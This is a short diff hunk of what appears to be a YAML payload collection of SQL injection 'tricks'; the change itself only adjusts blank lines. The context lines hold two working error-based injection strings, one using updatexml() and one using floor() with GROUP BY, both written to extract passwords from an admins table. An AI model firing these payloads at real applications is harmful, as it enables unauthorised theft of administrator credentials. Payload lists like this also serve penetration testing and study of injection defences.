@@ -45,7 +45,6 @@ tricks:
     payload: |
       # updatexml()
       ' AND updatexml(1, concat(0x7e, (SELECT password FROM admins)), 1) #
-      
+
       # floor() + group by
       ' UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM admins),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a #
-
